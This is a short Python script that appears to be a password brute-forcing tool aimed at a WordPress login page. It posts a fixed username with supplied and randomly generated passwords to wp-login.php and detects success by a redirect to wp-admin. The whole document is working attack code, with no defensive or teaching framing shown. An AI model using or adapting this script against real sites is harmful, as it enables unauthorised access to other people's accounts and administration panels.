import requests
import random
import string
from config import FIXED_USERNAME, login_url

def generate_random_password():
    chars = string.ascii_letters + string.digits + "!@#$%^&*.-_"
    length = random.randint(6, 12)
    return ''.join(random.choice(chars) for _ in range(length))

def try_password(password, include_random=True):
    session = requests.Session()
    passwords_to_try = [password]
    
    if include_random:
        # Add 2 random variations
        passwords_to_try.append(generate_random_password())
        passwords_to_try.append(password + generate_random_password()[:4])
    
    for pwd in passwords_to_try:
        login_data = {
            'log': FIXED_USERNAME,
            'pwd': pwd,
            'wp-submit': 'Acceder',
            'redirect_to': login_url.replace('wp-login.php', 'wp-admin/'),
            'testcookie': '1'
        }
        
        try:
            response = session.post(login_url, data=login_data, timeout=5)
            if "wp-admin" in response.url:
                return True, pwd
        except:
            continue
    
    return False, password